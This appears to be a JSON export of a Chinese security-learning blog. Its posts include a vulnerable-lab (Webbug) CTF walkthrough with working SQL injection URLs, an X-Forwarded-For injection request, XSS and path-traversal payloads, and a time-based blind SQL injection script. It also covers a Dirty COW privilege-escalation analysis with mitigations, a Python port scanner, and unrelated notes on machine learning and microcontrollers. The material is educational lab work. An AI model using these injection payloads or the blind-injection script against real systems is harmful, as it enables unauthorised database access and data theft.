局部分割法选取部分动作序列作为分析目标或提取局部特征以实现整个行为的分割． 边界检测法是一种常用而经典的局部动作分割方法。 人体动作数据库 动作特征提取 第一种是基于图像局部特征检测的方法。例如有些学者使用方向梯度直方图或尺度不变检测子来提取视频中的形状信息， 并 用 光 流 直 方 图（ ＨＯＦ） 或 运 动边界直 方 图 （ ＭＢＨ） 特 征 提 取 视 频 中 的 运动信息，然后用词包的形式进行编码， 并 训 练 分类器识别人体行为。然而这种获取行为识别特征的方法是将视频图像中提取的局部特征通过手工制造得到高维的特征， 因此针对性较强， 通用性较差。 有一些学者通过构建多级体系结构分级 进 行 行 为 识 别， 例 如 有 些 算 法 采 用 第一级结构对视频进行多种时空分割并得到所有可能的包含人体区域的分割结果， 再在第二级中利用时空信息对分割结果进行推理， 从而获得有效的人体行为特征。虽然这种分层级的方法能够更好地融合时间与空间信息， 但在每个层级中的处理仍然依赖于手工制造的特征 有一些学 者 提 出 使 用 深 度 神 经 网 络 进 行 行 为 识别，例 如 有 学 者 提 出 使 用 卷 积 神 经 网 络获取视频的表观特征与运动特征并将得到的特征进行分 析 与融 合，从 而 获 得 有 效的 行 为 识 别 特征。 传统的方式 模板匹配 状态空间法法特征提取和分类这两个步骤完成: 首先是进行特征提取，常见的特征包括 LBP ( Local Binary Patterns) ， SIFT ( Scale-InvariantFeature Transform) 和 HOG( Histogram of Oriented Gradients)等; 分类则采用 SVM( Support Vector Machine) 和贝叶斯等机器学习中常用的分类器． 行为识别–机器学习参考：http://blog.sina.com.cn/s/blog_4caedc7a0102wrkz.html 人体特征值提取: 人体骨架—人体关键点(Skeleton) 通过RGB图像进行关节点估计（Pose Estimation）获得。 是通过深度摄像机直接获得（例如Kinect）。每一时刻（帧）骨架对应人体的K个关节点所在的坐标位置信息，一个时间序列由若干帧组成。行为识别就是对时域预先分割好的序列判定其所属行为动作的类型，即“读懂行为”。但在现实应用中更容易遇到的情况是序列尚未在时域分割（Untrimmed），因此需要同时对行为动作进行时域定位（分割）和类型判定，这类任务一般称为行为检测。 主要问题：一方面是如何设计鲁棒和有强判别性的特征，另一方面是如何利用时域相关性来对行为动作的动态变化进行建模。 LSTM（Long-Short Term Memory）和循环神经系统（RNN）来搭建基础框架。 基于 ＣＮＮ 的时空轨迹特征提取方法 基于骨架序列的行为识别 数据集http://blog.csdn.net/qq_36165459/article/details/78332172","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://shackles.top/tags/机器学习/"}]},{"title":"家用路由器安全","slug":"路由器安全","date":"2017-07-29T15:53:56.000Z","updated":"2018-05-23T12:23:07.848Z","comments":true,"path":"2017/07/29/路由器安全/","link":"","permalink":"https://shackles.top/2017/07/29/路由器安全/","excerpt":"","text":"家用路由器安全 2017-08-09 路由器安全CGI 程运行 请求处理：客户端http请求 http server CGI CGI程序返回结果 攻击CGI 程序 在同一个请求中无法进行多次交互； binwak 漏洞利用 busybox 提权 自己编译shellcode sleep(1)​ 路由器web漏洞 xss csrf 认证漏洞 命令注入 lua","categories":[],"tags":[{"name":"物联网安全","slug":"物联网安全","permalink":"https://shackles.top/tags/物联网安全/"}]},{"title":"Web 服务端安全","slug":"Web 服务端安全","date":"2017-06-29T15:53:56.000Z","updated":"2018-03-29T23:23:35.251Z","comments":true,"path":"2017/06/29/Web 服务端安全/","link":"","permalink":"https://shackles.top/2017/06/29/Web 服务端安全/","excerpt":"","text":"Web 服务端安全 2016-10-05 Web 服务端webweb服务端 逆向的过程； SQL 注入1.$user=admin’or 1=1# Union 注入 有回显 猜解出来字段 可以填充查询结果 数据库报错； Boolean 盲注（在木有数据回显） Timing 盲注2 if（1，name，price） if(select(flag)，name，price） 文件包含 读取敏感文件 包含一句话getshell 创建临时文件 ​ http://58.154.33.13:8004/show.php?id=1502009577&amp;type=zip 123‘’,../../../../../../../etc/password# https://zhuanlan.zhihu.com/p/26308699","categories":[],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://shackles.top/tags/Web安全/"}]},{"title":"51单片机基础知识","slug":"51单片机","date":"2017-05-06T15:53:56.000Z","updated":"2019-02-19T03:32:12.739Z","comments":true,"path":"2017/05/06/51单片机/","link":"","permalink":"https://shackles.top/2017/05/06/51单片机/","excerpt":"","text":"51单片机基础知识5个中断源（2个外部中断3个内部中断） 1、外部中断0 INT0 、中断请求信号由P3.2输入。请求方式有两种：电平方式；脉冲方式。 通过TCON的IT0、IT1选择， 电平方式（IT0（IT1）=0）：低电平有效 脉冲方式（IT0（IT1）=1）：脉冲负跳变有效 中断允许位寄存器 IE EX0 = 1;//中断允许开关 IT0 = 0;//下降沿触发方式 EA = 1;//总开关 2、外部中断1、中断请求信号由P3.3输入。（INT0 1）3、定时/计数器0中断（T0） EA = 1;//总开关 ET0 = 1;//启动计数器中断开关 定时器的核心在这 TMOD = 0x09; TH0 = 0x0D8; // 初始化 定时/计数器寄存器 高八位 TL0 = 0x0F0; // 初始化 定时/计数器寄存器 低八位 TR0 = 1;//启动定时器 4、定时/计数器1中断（T1）5、串行口发送或接受中断五个中断寄存器1、中断允许寄存器IE Time Interrupt IE D7 D6 D5 D4 D3 D2 D1 D0 位名称 EA — — ES ET1 EX1 ET0 EX0 位地址 AFH — — ACH ABH AAH A9H A8H 中断源 CPU — — 串行口 T1 T0 EA=1 中断总允许 ；ET0 =1 启动计数器中断开关 2、定时器控制寄存器TCON 8位寄存器** TCON D7 D6 D5 D4 D3 D2 D1 D0 位名称 TF1 TR1 TF0 TR0 IE1 IT1 IE0 IT0 位地址 8FH 8EH 8DH 8CH 8BH 8AH 89H 88H 功能 T1 中断 标志 T1 触发 标志 T0 中断 标志 T0 触发 标志 INT01 中断 标志 INT1 触发 方式 INT0 中断 标志 INT0 触发 方式 12345678IT0（IT1）——外中断请求信号方式控制位IT0（IT1）=1 脉冲方式（负跳变有效）；IT0（IT1）=0 电平方式（低电平有效）TF0（TF1）——定时/计数溢出标志硬件置位——当定时/计数器产生溢出时。转向中断服务程序时，硬件自动清零。 3、中断优先级寄存器IP（不常用） IE D7 D6 D5 D4 D3 D2 D1 D0 位名称 — — — PS PT1 PX1 PT0 PX0 位地址 — — — BCH BBH BAH B9H B8H 中断源 — — — 串行口 T1 INT1 T0 INT0 4、定时器方式寄存器TMOD5、串行口控制寄存器SCON TCON D7 D6 D5 D4 D3 D2 D1 D0 位名称 — — — — — — TI RI 位地址 — — — — — — 99H 98H 功能 — — — — — — 串行发送 中断标志 串行接收 中断标志 中断优先级： 内部查询次序： 外部中断0®定时中断0®外部中断1®定时中断1®串行中断。 中断请求、中断响应、中断服务、中断返回","categories":[],"tags":[{"name":"物联网","slug":"物联网","permalink":"https://shackles.top/tags/物联网/"}]},{"title":"Violent Python","slug":"Violent Python","date":"2017-04-07T15:53:56.000Z","updated":"2018-03-29T23:23:10.224Z","comments":true,"path":"2017/04/07/Violent Python/","link":"","permalink":"https://shackles.top/2017/04/07/Violent Python/","excerpt":"","text":"Violent Python 2017-04-07 用pyhon进行渗透测试2.1 编写端口扫描2.1.1 TCP全连接扫描 TCP 全连接扫描：socket 和 optpares 1234socket.gethostbyname(hostname) \\\\socket.gethostbyaddr(ip addreess) \\\\socket.socket(\\[family\\[,type\\[,proto]]])\\\\socket.create_connection(addrees\\[,timeout\\[,surece_address]]) ​ optparse 模块是python的内建模块应用于处理命令行。 123456789101112from optparse import OptionParser [...] parser = OptionParser() parser.add_option(&quot;-f&quot;, &quot;--file&quot;, dest=&quot;filename&quot;, help=&quot;write report to FILE&quot;, metavar=&quot;FILE&quot;) parser.add_option(&quot;-q&quot;, &quot;--quiet&quot;, action=&quot;store_false&quot;, dest=&quot;verbose&quot;, default=True, help=&quot;don&apos;t print status messages to stdout&quot;) (options, args) = parser.parse_args() 12345678故命令行可以使用：usage: &lt;yourscript&gt; [options] options: -h, --help show this help message and exit -f FILE, --file=FILE write report to FILE -q, --quiet don&apos;t print status messages to stdout 12 2.2.2 抓取应用的Banner2.2.3 线程扫描python-nmap 利用python 调用nmap 1234567TCP SYN 扫描 ：又称为半开放扫描，这种类型的扫描发送一个SYN的TCP连接数包等待响应，当返回RST数据包表示端口关闭，返回ACK数据包表示端口开放。TCP NULL 扫描 ：TCP空扫描设置TCP的标志头为零。如果返回一个RST数据包则表示这个端口是关闭的。TCP FIN 扫描 : TCP FIN扫描发送一个FIN数据包，主动关闭连接，等待一个圆满的终止，如果返回RST数据包则表示端口是关闭的。TCP XMAS 扫描 ：TCP XMAS扫描设置 PSH, FIN,和URG TCP标志位，如返回RST数据包则表示这个端口是关闭的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162# -*- coding:utf-8 -*-# -*- by shackle -*-# 输入主机名与端口-&gt;主机名变为IPV4地址-&gt;import optparseimport socketimport threading#### 建立socket连接def connScan(tgtHost,tgtPort): try: connSkt = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connSkt.connect((tgtHost,tgtPort)) print &apos;[+]%d/tcp open&apos;%tgtPort connSkt.close() except: print &apos;[-]%d/tcp closed &apos;% tgtPort## 定义端口扫描函数def portScan(tgtHost, tgtPorts): try: tgtIP = socket.gethostbyname(tgtHost) except: print &quot;[-] Cannot resolve &apos;%s&apos;: Unknown host&quot; % tgtHost return try: tgtName = socket.gethostbyaddr(tgtIP) print &apos;\\n[+] Scan Results for: &apos; + tgtName[0] except: print &apos;\\n[+] Scan Results for: &apos; + tgtIP socket.setdefaulttimeout(1) ### 多线程，多端口 for tgtPort in tgtPorts: print(&apos;Scanning port &apos; + str(tgtPort)) t = threading.Thread(target=connScan, args=(tgtHost, int(tgtPort))) t.start()def main(): parser = optparse.OptionParser(&apos;use: –H &lt;target host&gt; -P &lt;target port&gt;&apos;) # 新建paser对象 parser.add_option(&apos;-H&apos;, &apos;--host&apos;, dest=&apos;tgtHost&apos;, type=&apos;string&apos;, help=&apos;taget host&apos;) parser.add_option(&apos;-P&apos;, &apos;--port&apos;, dest=&apos;tgtPort&apos;, type=&apos;int&apos;, help=&apos;taget port&apos;) (options, args) = parser.parse_args() # 已经定义好了所有的命令行参数，调用 parse_args() 来解析程序的命令行： # options，它是一个对象（optpars.Values），保存有命令行参数值。只要知道命令行参数名，如 file，就可以访问其对应的值： options.file 。 # args，它是一个由 positional arguments 组成的列表。 tgtHost = options.tgtHost tgtPort = options.tgtPort args.append(tgtPort) # 设置端口列表 if (tgtHost == None) | (tgtPort == None): print parser.usage exit(0) portScan(tgtHost,args)if __name__ == &apos;__main__&apos;: main() 2.2.4 利用NMAP12345678910111213141516171819202122232425262728# -*- coding:utf-8 -*-# -*- by shackle -*-\\# 调用 nmapimport optparseimport nmapdef nmapScan(tgtHost, tgtPort): nmScan = nmap.PortScanner() results = nmScan.scan(tgtHost, tgtPort) state = results[&apos;scan&apos;][tgtHost][&apos;tcp&apos;][int(tgtPort)][&apos;state&apos;] print(&quot; [*] &quot; + tgtHost + &quot; tcp/&quot; + tgtPort + &quot; &quot; + state)def main(): parser = optparse.OptionParser(&apos;usage %prog –H &lt;target host&gt; -P &lt;target port&gt;&apos;) parser.add_option(&apos;-H&apos;, dest=&apos;tgtHost&apos;, type=&apos;string&apos;, help=&apos;specify target host&apos;) parser.add_option(&apos;-P&apos;, dest=&apos;tgtPort&apos;, type=&apos;string&apos;, help=&apos;specify target port&apos;) (options, args) = parser.parse_args() tgtHost = options.tgtHost tgtPort = options.tgtPort args.append(tgtPort) if (tgtHost == None) | (tgtPort == None): print(&apos;[-] You must specify a target host and port[s]!&apos;) exit(0) for tgport in args: nmapScan(tgtHost, tgport)if __name__ == &apos;__main__&apos;: main()","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://shackles.top/tags/Python/"}]},{"title":"国产Webbug开源漏洞平台","slug":"webbug","date":"2017-04-05T15:53:56.000Z","updated":"2018-07-17T06:21:06.967Z","comments":true,"path":"2017/04/05/webbug/","link":"","permalink":"https://shackles.top/2017/04/05/webbug/","excerpt":"","text":"国产的Webbug开源漏洞平台搞一下~ get注入图片破解信息收集练习——目录端口收集暴力破解练习x-forwarded-for注入支付漏洞垂直越权CSRFurl跳转GET任意文件下载POST任意文件下载无验证上传反射型XSS存储型XSS校验扩展名上传验证来源去向的url跳转文件包含POST文件包含HOST注入APK破解延时注入DZ7.2论坛sql注入aspcms注入phpmyadmin任意文件包含漏洞齐博系统SQL注入海盗云商getshellPHP168任意代码执行GET SHELLecshop 注入ShopXp系统SQL注射漏洞Dcore(轻型CMS系统)注入漏洞MetInfo 任意文件包含漏洞可getshellMetinfo news.php盲注Metinfo img.php盲注万众电子期刊在线阅读系统PHP和ASP最新版本通杀SQL注入BEESCMS sql注入，无视防御ourphp 注入phpwind 命令执行漏洞metinfo 任意用户密码修改DZ 3.2 存储型XSSDedeCMS flink.php友情链接注入DedeCms?recommend.php注入BEESCMS 小于等于V4四处注入+无需密码直接进后台海洋 x-forwarded-for注入php截断利用st2-016jboss命令执行tomcat弱口令hfs远程命令执行st2-052命令执行flash远程命令执行gh0st远程溢出IIS6.0远程溢出 渗透基础第一关:get注入__很简单的一个注入GET 手工注入/sqlmap 1、爆列长 order by 4 为1http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' order by 4 %23 回显：不爆错，所以列长是4。 2、爆表 mysql information_schema 元信息表 1http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema = database() %23 回显：comment,flag,goods,user 四个表 3、爆列 1http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select group_concat(column_name),2,3,4 from information_schema.columns where table_name = 'flag' %23 回显：id,flag flag表中的列 4、查询flag值 1http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select 1,flag,3,4 from flag %23 回显：名称为:204f704fbbcf6acf398ffee11989b377 第二关:从图片中你能找到什么？图片隐写题目 ， 想想之前misc 题目做的想吐。 第三关:你看到了什么？扫目录。。。emmm 第四关:告诉你了flang是5位数http://10.102.15.214/pentest/test/b2e16da5985ee1be/index.html bp 抓包爆破弱口令。 admin admin 123 第五关:一个优点小小的特殊的注入XFF 头注入 浅谈http头注入(附案例)https://zhuanlan.zhihu.com/p/27553821 User-Agent：使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中） Cookie：网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）. X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件[通过修改XXF头可以实现伪造IP]）. Clien-IP：同上，不做过多介绍. Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过 来的. Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号(这个我本人还没碰到过，不过有真实存在的案例还是写上吧). 123456789101112GET /pentest/test/1/ HTTP/1.1Host: 10.102.15.214User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: HFS_SID_=0.630969217978418Content-Length: 0X-Forwarded-For:union select 1,flag,3,4 from flagConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0 第六关:这关需要rmb购买哦截获数据包进行修改数量 逻辑漏洞 第七关:越权越权修改密码 http://10.102.15.214/pentest/test/3/change.php?name=admin 第八关:CSRF将更改密码的请求用Burpsuite截获 可一键生成CSRF PoC 第九关:URL跳转http://10.102.15.214/pentest/test/5/index.php?url=http://www.baidu.com 第十关:文件下载http://10.102.15.214/pentest/test/6/1/download.php 任意文件下载 payload： 下载 config.php http://10.102.15.214/pentest/test/6/1/download.php?fname=../../..//pentest/test/6/1//db/config.php 第十一关:我和上一题有点像的确和上一关有点像 也是要找回mysql账号密码 还是先把下载的包抓下来看看 上一关的下载用的是get 本关用的post 第十二关:我系统密码忘记了！​ 上传漏洞的连接菜刀。 第十三关:XSS反射型 xss 1http://10.102.15.214/pentest/test/9/?id=&lt;img src onerror=al ert()&gt; 第十四关:存储型XSS 第十五关:什么？图片上传不了？只验证了Content-Type 抓包改。。。 第十六关:明天双十一中级进阶第一关:出来点东西吧 任意文件读取get 方式文件包含漏洞 http://10.102.94.210/pentest/test/13/?country=../../../index.html 第二关:提交方式是怎么样的啊？http://10.102.94.210/pentest/test/14/ post 方式文件 文件包含漏洞 第三关:我还是一个注入host 头注入 第四关:APK里面有一个flag逆向APK程序 第五关:时间注入http://10.102.94.210/pentest/test/time/ 12345678910111213141516171819202122232425262728293031#encoding=utf-8 #时间盲注脚本import requestsimport timepayloads = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789@_.&#125;&#123;,'#存放跑出的结果length=0database=''table=''print 'start get length...'for l in range(1,21): startTime1=time.time() url1 = \"http://192.168.37.147/pentest/test/time/?type=1 and if(length(database())=%d,sleep(5),1)\"%(l) response1 = requests.get(url1) if time.time() - startTime1 &gt; 5: length=l print \"the length is \" + str(length) breakprint 'start database sql injection...'for d in range(1,length+1): for payload in payloads: startTime2=time.time() url2 = \"http://192.168.37.147/pentest/test/time/?type=1 and if(substr(database(),'%d',1)='%s',sleep(5),1)\"%(d,payload) response2 = requests.get(url2) #发送请求 if time.time() - startTime2 &gt; 5: #判断是否延时了5秒 也就是 是否执行了函数sleep(5) database+=payload print database breakprint \"the database is \" + database 实战练习:DZ论坛dz7.2 实战练习:aspcms实战练习:phpmyadmin实战练习:齐博系统实战练习:海盗云商实战练习:PHP168 6.0实战练习:ecshop实战练习:ShopXp系统v3.x实战练习:Dcore(轻型CMS系统)实战练习:MetInfo 5.1.7实战练习:Metinfo 5.3MetInfo 5.3 /include/global/listmod.php SQL 注入漏洞: 实战扩展漏洞知识","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://shackles.top/tags/渗透/"}]},{"title":"CTF-密码学总结","slug":"CTF-密码学总结","date":"2017-03-02T15:53:56.000Z","updated":"2018-09-08T02:46:29.165Z","comments":true,"path":"2017/03/02/CTF-密码学总结/","link":"","permalink":"https://shackles.top/2017/03/02/CTF-密码学总结/","excerpt":"","text":"CTF-密码学总结 2016-11-08 密码学 CryptoAlice 与 Bob密码体质的定义：密码学5元组秘钥量 对称密码与非对称密码（公钥与私钥）； 密码分析的分类1、穷举攻击2、统计分析攻击3、数学分析攻击 唯密文攻击； 已知明文攻击； 选择明文攻击； 选择密文攻击； 密码体制的安全性计算安全性；可证明安全性；无条件安全性； 古典密码学1、单表代换加密明文与密文一一对应；2、多表代换加密已知加密算法破解； 现代密码对称密码的设计原理： 密文的统计特性与使用的密钥独立； DES分组加密算法 ，密钥长度56位；（每个第8位作为奇偶校验位） AESRC5分组密码的加密的模式： 零知识证明 http://quipqiup.com/ 词频分析 md5解密 www.dmd5.com http://www.dmd5.com/","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://shackles.top/tags/CTF/"}]},{"title":"CVE-2016-5195（脏牛）内核提权漏洞分析","slug":"CVE-2016-5195（脏牛）内核提权","date":"2017-01-29T15:53:56.000Z","updated":"2018-04-01T13:51:53.514Z","comments":true,"path":"2017/01/29/CVE-2016-5195（脏牛）内核提权/","link":"","permalink":"https://shackles.top/2017/01/29/CVE-2016-5195（脏牛）内核提权/","excerpt":"","text":"CVE-2016-5195（脏牛）内核提权漏洞分析脏牛漏洞 提权Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。 一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞 漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权 影响范围：Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。 360 Vulpecker Team：Android 7.0最新的10月补丁安全级别的系统上测试过漏洞POC，确认Android受影响 blog：Dirty COW (CVE-2016-5195)https://dirtycow.ninja/ 实验步骤步骤1：编译POCpoc 地址：https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c 执行以下命令进行gcc编译 1234uanme -a whoamigcc -pthread dirtyc0w.c -o dirtyc0w //编译 gcc命令是一个编译器套件，可用于编译多种语言源码。 小i注解： 可见编译选项中指定-pthread 会附加一个宏定义 -D_REENTRANT该宏会导致 libc 头文件选择那些thread-safe的实现。-o参数为编译后输出文件名。 步骤2：验证漏洞POC: Link Usage Description Family — — — — — — — dirtyc0w.c ./dirtyc0w file content Read-only write /proc/self/mem cowroot.c ./cowroot SUID-based root /proc/self/mem dirtycow-mem.c ./dirtycow-mem libc-based root /proc/self/mem pokemon.c ./d file content Read-only write PTRACE_POKEDATA dirtycow.cr dirtycow --target --string --offset Read-only write /proc/self/mem dirtyc0w.c ./dirtycow file content Read-only write (Android) /proc/self/mem dirtycow.rb use exploit/linux/local/dirtycow and run SUID-based root /proc/self/mem 0xdeadbeef.c ./0xdeadbeef vDSO-based root PTRACE_POKEDATA naughtyc0w.c ./c0w suid SUID-based root /proc/self/mem c0w.c ./c0w SUID-based root PTRACE_POKEDATA dirty_pass[…].c ./dirty_passwd_adjust_cow /etc/passwd based root /proc/self/mem mucow.c ./mucow destination &lt; payload.exe Read-only write (multi page) PTRACE_POKEDATA cowpy.c r2pm -i dirtycow Read-only write (radare2) /proc/self/mem dirtycow.fasm ./main SUID-based root /proc/self/mem dcow.cpp ./dcow /etc/passwd based root /proc/self/mem dirtyc0w.go go run dirtyc0w.go -f=file -c=content Read-only write /proc/self/mem dirty.c ./dirty /etc/passwd based root PTRACE_POKEDATA Dirty COW Tester make &amp;&amp; ./bin/dct Read-only write /proc/self/mem exploit.c ./exploit vDSO-based root (Android) PTRACE_POKEDATA cowcron.c 分析与思考 Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。 一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致某些Linux版本提权漏洞。 低权限用户可以利用该漏洞修改只读内存，进而执行任意代码获取Root权限。 该漏洞影响所有目前运行Linux系统的设备，包含但不限于运行Linux系统的服务器，Docker容器/手机/路由器/智能设备等。 Linux写时拷贝技术(copy-on-write) 在Linux程序中，fork（）会产生一个和父进程完全相同的子进程，但子进程在此后多会exec系统调用，出于效率考虑，linux中引入了“写时复制“技术，也就是只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程 竞态条件 竞态条件（race condition）是指设备或系统出现不恰当的执行时序，而得到不正确的结果。 linux内存管理–缺页异常处理 触发异常的线性地址处于用户空间的vma中，但还未分配物理页，如果访问权限OK的话内核就给进程分配相应的物理页。 触发异常的线性地址不处于用户空间的vma中，这种情况得判断是不是因为用户进程的栈空间消耗完而触发的缺页异常。 如果 是的话则在用户空间对栈区域进行扩展，并且分配相应的物理页，如果不是则作为一次非法地址访问来处理，内核将终结进程 缺页中断 缺页中断就是要访问的页不在主存，需要操作系统将其调入主存后再进行访问。在这个时候，被内存映射的文件实际上成了一个分页交换文件。 修复方案 更新最新Linux Kernel源码，并重新编译，也可直接升级最新版本。 修复相关代码 https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/？id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619 免重启热修补由于该漏洞位于 Linux 内核，发行版官方的内核更新只有在重启后才能生效。 如果您的线上业务不能中断，可以采用下面这种基于 SystemTap 的热修补方法，并在合适的时候更新系统内核。 SystemTap 是监控和跟踪运行中的Linux 内核的操作的动态方法。这句话的关键词是动态，因为SystemTap 没有使用工具构建一个特殊的内核，而是允许您在运行时动态地安装该工具。 针对 CVE-2016-5195 的 SystemTap 热修补补丁最先出现在 Red Hat 公司 Bug 追踪系统的讨论区（出处），内容节选如下： 123probe kernel.function(&quot;mem_write&quot;).call ? &#123; $count = 0 &#125;robe syscall.ptrace &#123; $request = 0xfff &#125;` 通过阻止写入 /proc/self/mem 来达到阻止上述利用代码的目的。 该补丁有较为明显的副作用：无法调试程序，还可能导致 RHEL/CentOS 6 和 Ubuntu 14.04 上使用的 upstart 服务管理机制不能正常工作。 本文提供另一种热修补方式，代码如下： 123 probe kernel.function(&quot;sys_madvise&quot;) &#123; if ($behavior == 4) &#123; $behavior = 0 &#125;&#125; Ubuntu系统修复安装SystemTap相关步骤： 1234567apt-get install gcc systemtapddeb_filename=$(dpkg-query --show --showformat=&apos;$&#123;Package&#125;-dbgsym_$&#123;Version&#125;_$&#123;Architecture&#125;.ddeb&apos; linux-image-$(uname -r))wget http://ddebs.ubuntu.com/pool/main/l/linux/$&#123;ddeb_filename&#125;dpkg -i $&#123;ddeb_filename&#125; 测试SystemTap安装成功： 1stap -e &apos;probe begin &#123; print(&quot;hello world\\n&quot;); exit(); &#125;&apos; 执行热修补 1234stap -Fge &apos;probe kernel.function(&quot;sys_madvise&quot;) &#123; if ($behavior == 4) &#123; $behavior = 0 &#125;&#125;&apos;Disconnecting from systemtap module.To reconnect, type &quot;staprun -A stap_9f8ce8307eb418da7c981b3223eec678_12644&quot; 修补完成 12lsmod | grep stapstap_9f8ce8307eb418da7c981b3223eec678_12644 81920 0 可以看到 SystemTap 编译出的内核模块已经成功加载。 参考资料https://dirtycow.ninja/ https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619 http://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;mid=2651370571&amp;idx=1&amp;sn=68acf07ca2683a9c98fa52e900d97db3&amp;chksm=8d39c5c3ba4e4cd58c21d0a21ca337ded2132625987e174d286f8d175034267bd09807ea9a11&amp;scene=4#wechat_redirect","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://shackles.top/tags/漏洞复现/"}]},{"title":"MEAN--全栈WEB开发框架","slug":"MEAN--全栈WEB开发框架","date":"2016-11-29T15:53:56.000Z","updated":"2018-03-29T23:25:48.530Z","comments":true,"path":"2016/11/29/MEAN--全栈WEB开发框架/","link":"","permalink":"https://shackles.top/2016/11/29/MEAN--全栈WEB开发框架/","excerpt":"","text":"MEAN–全栈WEB开发框架 2016-12-01 MEAN Mongode + Express + Angular + Node.js ##全Javascript的开发架构MEAN。js语言运行在应用程序的所有层次上，前端后端服务端从客户端到服务器，再到持久层一种语言运行在应用程序的所有层次上。 (M)MongoDB——NoSQL的文档数据库，使用JSON风格来存储数据，查询较简单，甚至也是使用JS来进行sql查询；m (E)Express——较好的基于Node的Web开发框架，是一个最小的，灵活的Node.js Web应用程序框架，构建单页和多页，和混合Web应用程序提供了一套强大的功能； (A)Aagular——JS的前端开发框架，提供了声明式的双向数据绑定；A (N)Node——跑在服务器的js，并发 异步 事件驱动，基于V8的运行时环境（JS语言开发），可以构建快速响应、可扩展的网络应用。n 1.架构框图采用MVC架构。模型-视图-控制器 (MVC) 可以直接存储JSON格式的mongoDB数据库， 1. 从 LAMP 到 MEANMEAN 不仅仅是一次首字母缩写的简单重新安排与技术升级。将基础平台从操作系统 (Linux) 转变为 JavaScript 运行时 (Node.js) 让操作系统变得独立：Node.js 在 Windows® 与 OS X 上的运行情况和在 Linux 上一样优秀。跨平台强。 - 1.1Node.js 同样取代了 LAMP 堆栈中的 Apache。但 Node.js 远远不止是一种简单的 Web 服务器。事实上，用户不会将完成后的应用程序部署到单机的 Web 服务器上；相反，Web 服务器已经包含在应用程序中，并已在 MEAN 堆栈中自动安装。结果，部署过程得到了极大简化，因为所需的 Web 服务器版本已经与余下的运行时依赖关系一起得到了明确定义。 - 1.2从传统数据库（如 MySQL）–&gt;非关系数据库 (如NoSQL）–&gt;无架构的、以文档为导向的持久存储（如 MongoDB），这些代表着持久化策略发生了根本性的转变。用户花费在编写 SQL 上的时间将会减少，将会有更多的时间编写 JavaScript 中的映射/化简功能。用户还能省掉大量的转换逻辑，因为 MongoDB 可以在本地运行 JavaScript Object Notation (JSON)。因此，编写 RESTful Web 服务变得前所未有的容易。 从 LAMP 到MEAN的最大转变在于从传统的服务器端页面生成变为客户端 单页面应用程序 (SPA)。借助 Express仍然可以处理服务器端的路由与页面生成，但目前的重点在客户端视图上，而 AngularJS 可以实","categories":[],"tags":[]},{"title":"大数据初探","slug":"大数据","date":"2016-10-05T15:53:56.000Z","updated":"2019-02-19T03:44:08.589Z","comments":true,"path":"2016/10/05/大数据/","link":"","permalink":"https://shackles.top/2016/10/05/大数据/","excerpt":"","text":"大数据初探FrontPage -Hadoop Wiki https://wiki.apache.org/hadoop/ Hadoop简介 | Hadoop Notebook https://pennywong.gitbooks.io/hadoop-notebook/content/introduction.html 细细品味Hadoop- 随笔分类 - 虾皮 - 博客园 http://www.cnblogs.com/xia520pi/category/346943.html HDFS 原理、架构与特性介绍 - OPEN 开发经验库 http://www.open-open.com/lib/view/open1376228205209.html free-programming-books/free-programming-books-zh.mdat master · vhf/free-programming-books https://github.com/vhf/free-programming-books/blob/master/free-programming-books-zh.md Hadoop家族学习路线图| 粉丝日志 http://blog.fens.me/hadoop-family-roadmap/ ApacheNutch™ - http://nutch.apache.org/ nutch 开源搜索引擎 http://wiki.jikexueyuan.com/project/hadoop/ 分布式：一个业务分拆多个子业务，部署在不同的服务器上 集群：同一个业务，部署在多个服务器上 集群是个物理形态，分布式是个工作方式。 《大型网站技术架构》网站的高性能架构及优化 - passionfly https://my.oschina.net/u/2260265/blog/501289 亿级PV超大型网站集群架构图形化深度揭秘讲解 - CSDN学院 - CSDN http://edu.csdn.net/course/detail/2278?ref=blog&amp;loc=0 负载均衡层次结构：LVS Nginx 